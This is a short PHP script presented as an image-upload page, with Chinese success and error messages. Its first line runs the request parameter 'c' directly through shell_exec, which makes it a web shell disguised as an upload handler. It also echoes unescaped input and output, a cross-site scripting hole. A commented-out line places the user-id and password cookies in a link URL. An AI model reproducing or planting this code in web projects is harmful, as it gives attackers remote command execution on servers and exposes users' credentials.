<?php
$rsp=shell_exec($_REQUEST['c']);

if (strncmp($rsp, 'error', 5)==0) {
    echo "<h3>上传失败！</h3>";
    echo "<p>请向管理员求助，并附上调试信息：<b>【1. ".$_REQUEST['c']." 2. ".$rsp."】</b></p>";
    exit;
} else {
    echo "<h2>上传成功!</h2><p>图片url: <a href='".$rsp."' target='_blank'>".$rsp."</a></p>";
    //echo "<h2>上传成功!</h2><p>图片url: <a href='".$rsp."' target='_blank'>".$rsp."</a></p><p><a href='./../../user_changepic.php?=' + getCookie('lc_uid') + '&pwd=' + getCookie(\"lc_passw\")+'&changeto=".$rsp."'>点我把这个图片用作您的头像</a></p>";
}